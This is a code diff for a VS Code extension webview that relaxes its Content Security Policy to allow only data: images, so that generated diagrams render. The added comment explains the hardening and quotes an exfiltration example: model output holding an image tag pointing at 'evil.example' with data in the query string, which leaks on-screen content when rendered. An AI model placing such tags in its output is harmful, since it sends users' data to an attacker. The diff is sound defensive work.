@@ -39,11 +39,27 @@ function renderHtml(webview: vscode.Webview, extensionUri: vscode.Uri): string {
   // No `style-src` entry is needed: React's `style` prop sets properties via the
   // CSSOM directly rather than through inline `style=""` attributes or `<style>`
   // tags, so it isn't subject to CSP at all. No remote assets, ever (invariant 4).
+  /*
+   * `img-src data:` and nothing else — deliberately narrower than it looks.
+   *
+   * This was `'none'`, which blocked every image including the diagrams `show_diagram` generates,
+   * and they rendered as a broken-image glyph. The reason it was `'none'` is the classic
+   * exfiltration trick: model output containing `<img src="https://evil.example/?d=…">` sends
+   * whatever is on screen to whoever wrote it, as a side effect of *rendering*.
+   *
+   * A `data:` URI cannot do that. It makes no request, so there is nowhere for anything to be
+   * sent — the hole that `'none'` was closing stays closed, because no remote scheme is allowed
+   * here at all. Not `'self'` either, which would be broader than anything needs.
+   *
+   * And an SVG loaded through `<img>` cannot run script whatever it contains, which is the same
+   * property the guide's diagrams rely on. The markup is generated in core from a validated graph
+   * with every label escaped, so this is the second line rather than the first.
+   */
   const csp = [
     "default-src 'none'",
     `script-src 'nonce-${nonce}'`,
     "connect-src 'none'",
-    "img-src 'none'",
+    'img-src data:',
   ].join('; ')
 
   return `<!DOCTYPE html>
